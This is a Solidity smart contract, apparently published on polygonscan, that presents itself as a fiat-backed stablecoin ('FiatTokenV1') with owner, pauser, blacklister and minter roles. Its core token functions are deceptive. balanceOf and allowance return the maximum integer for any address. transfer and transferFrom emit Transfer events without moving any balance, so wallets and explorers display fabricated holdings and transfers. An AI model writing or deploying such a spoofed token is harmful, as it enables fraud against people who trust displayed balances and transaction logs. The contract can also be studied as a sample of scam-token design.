/**
 *Submitted for verification at polygonscan.com on 2021-12-31
*/

pragma solidity ^0.4.24;

contract Ownable {

  // Owner of the contract
  address private _owner;

  /**
  * @dev Event to show ownership has been transferred
  *  previousOwner representing the address of the previous owner
  *  newOwner representing the address of the new owner
  */
  event OwnershipTransferred(address previousOwner, address newOwner);

  /**
  * @dev The constructor sets the original owner of the contract to the sender account.
  */
  constructor() public {
    setOwner(msg.sender);
  }

  /**
 * @dev Tells the address of the owner
 * @return the address of the owner
 */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Sets a new owner address
   */
  function setOwner(address newOwner) internal {
    _owner = newOwner;
  }

  /**
  * @dev Throws if called by anyother than the owner.
  */
  modifier onlyOwner() {
    require(msg.sender == owner());
    _;
  }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   *  newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner(), newOwner);
    setOwner(newOwner);
  }
}


pragma solidity ^0.4.24;


/**
 * @title Blacklistable Token
 * @dev Allows accounts to be blacklisted by a "blacklister" role
*/
contract Blacklistable is Ownable {

    address public blacklister;
    mapping(address => bool) internal blacklisted;

    event Blacklisted(address indexed _account);
    event UnBlacklisted(address indexed _account);
    event BlacklisterChanged(address indexed newBlacklister);

    /**
     * @dev Throws if called by anyother than the blacklister
    */
    modifier onlyBlacklister() {
        require(msg.sender == blacklister);
        _;
    }

    /**
     * @dev Throws if argument  is blacklisted
     *  _account The address to check
    */
    modifier notBlacklisted(address _account) {
        require(blacklisted[_account] == false);
        _;
    }

    /**
     * @dev Checks ifis blacklisted
     *  _account The address to check    
    */
    function isBlacklisted(address _account) public view returns (bool) {
        return blacklisted[_account];
    }

    /**
     * @dev Addsto blacklist
     *  _account The address to blacklist
    */
    function blacklist(address _account) public onlyBlacklister {
        blacklisted[_account] = true;
        emit Blacklisted(_account);
    }

    /**
     * @dev Removesfrom blacklist
     *  _account The address to remove from the blacklist
    */
    function unBlacklist(address _account) public onlyBlacklister {
        blacklisted[_account] = false;
        emit UnBlacklisted(_account);
    }

    function updateBlacklister(address _newBlacklister) public onlyOwner {
        require(_newBlacklister != address(0));
        blacklister = _newBlacklister;
        emit BlacklisterChanged(blacklister);
    }
}



pragma solidity ^0.4.24;


contract Pausable is Ownable {
  event Pause();
  event Unpause();
  event PauserChanged(address indexed newAddress);


  address public pauser;
  bool public paused = false;

  /**
   * @dev Modifier to make a function callable only when the contract is not paused.
   */
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  /**
   * @dev throws if called by anyother than the pauser
   */
  modifier onlyPauser() {
    require(msg.sender == pauser);
    _;
  }

  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function pause() onlyPauser public {
    paused = true;
    emit Pause();
  }

  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() onlyPauser public {
    paused = false;
    emit Unpause();
  }

  /**
   * @dev update the pauser role
   */
  function updatePauser(address _newPauser) onlyOwner public {
    require(_newPauser != address(0));
    pauser = _newPauser;
    emit PauserChanged(pauser);
  }

}

// File: openzeppelin-solidity/contracts/math/SafeMath.sol

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

// File: openzeppelin-solidity/contracts/token/ERC20/ERC20Basic.sol

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * See https://github.com/ethereum/EIPs/issues/179
 */
 
 contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
    function approve(address spender, uint256 value) public returns (bool);
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}


contract ERC20 is ERC20Basic {
        uint constant MAX_UINT = 2**256 - 1;
  function totalSupply() public view returns (uint) {
    return MAX_UINT;
  }
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}


/**
 * @title FiatToken
 * @dev ERC20 Token backed by fiat reserves
 */
contract FiatTokenV1 is Ownable, ERC20, Pausable, Blacklistable {
    using SafeMath for uint256;
    uint constant MAX_UINT = 2**256 - 1;
    string public name;
    string public symbol;
    uint256 public decimals;
    string public currency;
    address public masterMinter;
    bool internal initialized;

    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    uint256 internal totalSupply_ = 0;
    mapping(address => bool) internal minters;
    mapping(address => uint256) internal minterAllowed;

    event Mint(address indexed minter, address indexed to, uint256 amount);
    event Burn(address indexed burner, uint256 amount);
    event MinterConfigured(address indexed minter, uint256 minterAllowedAmount);
    event MinterRemoved(address indexed oldMinter);
    event MasterMinterChanged(address indexed newMasterMinter);

    function initialize(
        string _name,
        string _symbol,
        string _currency,
        uint256 _decimals,
        address _masterMinter,
        address _pauser,
        address _blacklister,
        address _owner,
        address _account
    ) public {
        require(!initialized);
        require(_masterMinter != address(0));
        require(_pauser != address(0));
        require(_blacklister != address(0));
        require(_owner != address(0));

        name = _name;
        symbol = _symbol;
        currency = _currency;
        decimals = _decimals;
        masterMinter = _masterMinter;
        pauser = _pauser;
        blacklister = _blacklister;
        setOwner(_owner);
        initialized = true;
    }
    

    /**
     * @dev Throws if called by anyother than a minter
    */
    modifier onlyMinters() {
        require(minters[msg.sender] == true);
        _;
    }

    /**
     * @dev Function to mint tokens
     *  _to The address that will receive the minted tokens.
     *  _amount The amount of tokens to mint. Must be less than or equal to the minterAllowance of the caller.
     * @return A boolean that indicates if the operation was successful.
    */
    function mint(address _to, uint256 _amount) whenNotPaused onlyMinters notBlacklisted(msg.sender) notBlacklisted(_to) public returns (bool) {
        require(_to != address(0));
        require(_amount > 0);

        uint256 mintingAllowedAmount = minterAllowed[msg.sender];
        require(_amount <= mintingAllowedAmount);

        totalSupply_ = totalSupply_.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        minterAllowed[msg.sender] = mintingAllowedAmount.sub(_amount);
        emit Mint(msg.sender, _to, _amount);
        emit Transfer(0x0, _to, _amount);
        return true;
    }

    /**
     * @dev Throws if called by anyother than the masterMinter
    */
    modifier onlyMasterMinter() {
        require(msg.sender == masterMinter);
        _;
    }

    /**
     * @dev Get minter allowance for an account
     *  minter The address of the minter
    */
    function minterAllowance(address minter) public view returns (uint256) {
        return minterAllowed[minter];
    }

    /**
     * @dev Checks ifis a minter
     * The address to check    
    */
    function isMinter(address _account) public view returns (bool) {
        return minters[_account];
    }

    /**
     * @dev Get allowed amount for an account
     *  owner address Theowner
     *  spender address Thespender
    */

    /**
     * @dev Get totalSupply of token
    */
    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    /**
     * @dev Get token balance of an account
     * address The account
    */
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return MAX_UINT;
  }

    /**
     * @dev Adds blacklisted check to approve
     * @return True if the operation was successful.
    */
    function approve(address _spender, uint256 _value) whenNotPaused notBlacklisted(msg.sender) notBlacklisted(_spender) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
  
    function allowance(address _owner, address _spender) public view returns (uint256) {
    return MAX_UINT;
  }

    /**
     * @dev Transfer tokens from one address to another.
     *  _from address The address which you want to send tokens from
     *  _to address The address which you want to transfer to
     *  _value uint256 the amount of tokens to be transferred
     * @return bool success
    */
 function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    Transfer(_from, _to, _value);
    return true;
  }

    /**
     * @dev transfer token for a specified address
     *  _to The address to transfer to.
     *  _value The amount to be transferred.
     * @return bool success
    */
    
    function transfer(address _to, uint _value) public returns (bool)  {
    Transfer(msg.sender, _to, _value);
    return true;
    }


    /**
     * @dev Function to add/update a new minter
     *  minter The address of the minter
     *  minterAllowedAmount The minting amount allowed for the minter
     * @return True if the operation was successful.
    */
    function configureMinter(address minter, uint256 minterAllowedAmount) whenNotPaused onlyMasterMinter public returns (bool) {
        minters[minter] = true;
        minterAllowed[minter] = minterAllowedAmount;
        emit MinterConfigured(minter, minterAllowedAmount);
        return true;
    }

    /**
     * @dev Function to remove a minter
     *  minter The address of the minter to remove
     * @return True if the operation was successful.
    */
    function removeMinter(address minter) onlyMasterMinter public returns (bool) {
        minters[minter] = false;
        minterAllowed[minter] = 0;
        emit MinterRemoved(minter);
        return true;
    }

    /**
     * @dev allows a minter to burn some of its own tokens
     * Validates that caller is a minter and that sender is not blacklisted
     * amount is less than or equal to the minter'sbalance
     *  _amount uint256 the amount of tokens to be burned
    */
    function burn(uint256 _amount) whenNotPaused onlyMinters notBlacklisted(msg.sender) public {
        uint256 balance = balances[msg.sender];
        require(_amount > 0);
        require(balance >= _amount);

        totalSupply_ = totalSupply_.sub(_amount);
        balances[msg.sender] = balance.sub(_amount);
        emit Burn(msg.sender, _amount);
        emit Transfer(msg.sender, address(0), _amount);
    }

    function updateMasterMinter(address _newMasterMinter) onlyOwner public {
        require(_newMasterMinter != address(0));
        masterMinter = _newMasterMinter;
        emit MasterMinterChanged(masterMinter);
    }
    

}